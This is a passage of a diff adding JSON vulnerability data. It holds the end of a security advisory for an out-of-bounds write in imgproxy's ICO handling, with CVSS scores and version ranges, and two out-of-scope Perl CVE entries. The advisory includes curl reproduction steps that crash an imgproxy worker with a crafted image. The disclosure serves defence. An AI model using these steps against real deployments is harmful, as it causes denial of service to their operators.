v4.0.15 with local file sources enabled:\r\n#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy\r\ncurl \"http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png\"\r\n# → request fails at transport level (connection reset / empty reply) or\r\n#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →\r\n#   Go panic dump → exit code 2. One request, one dead worker.\r\n\r\ncurl \"http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png\"\r\n# → HTTP 200, valid thumbnail (control)\r\n```\r\n\r\n### Impact\r\n\r\nCWE-787 out-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request. Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.",
+          "published_at": "2026-10-06T15:29:47Z",
+          "updated_at": "2026-10-06T15:29:47Z",
+          "withdrawn_at": null,
+          "severity": "high",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "score": 7.5
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "score": 7.5
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "",
+                "name": "github.com/darthsim/imgproxy"
+              },
+              "vulnerable_version_range": ">= 3.3.0, <= 4.0.16",
+              "patched_versions": ">= 4.0.17",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-494m-4556-wf5p",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123615",
+        "GO-2026-6895"
+      ]
+    }
+  ],
+  "outOfScopeCandidates": [
+    {
+      "id": "CVE-2026-121265",
+      "package": "SQL::Abstract",
+      "ecosystem": "Perl",
+      "reason": "Perl package outside seven allowed library ecosystems. Product reviewer also confirmed product category is not a fallback for out-of-scope package ecosystems; retained as out-of-scope candidate in both audits."
+    },
+    {
+      "id": "CVE-2026-123776",
+      "package": "RRD::CGI::Image",
+      "ecosystem": "Perl",
+      "reason": "Perl package outside seven allowed library ecosystems. Product reviewer also confirmed product category is not a fallback for out-of-scope package ecosystems; retained as out-of-scope candidate in both audits."
+    }
+  ]
+}
